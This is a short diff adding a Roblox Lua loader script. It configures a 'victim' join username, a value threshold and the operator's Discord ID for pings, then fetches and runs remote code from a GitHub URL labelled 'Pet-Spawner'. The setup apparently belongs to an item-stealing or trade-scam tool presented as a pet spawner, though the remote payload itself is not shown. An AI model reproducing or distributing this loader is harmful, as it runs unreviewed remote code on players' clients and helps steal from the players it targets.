@@ -1,0 +1,5 @@
+_G.Username = "DVwasttakken" -- user you should join victim on
+_G.min_value = 0.2
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.discuser = "1272117382445269072" -- change to your Discord user ID
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Medinololboi/Pet-Spawner/refs/heads/main/script.lua'))()
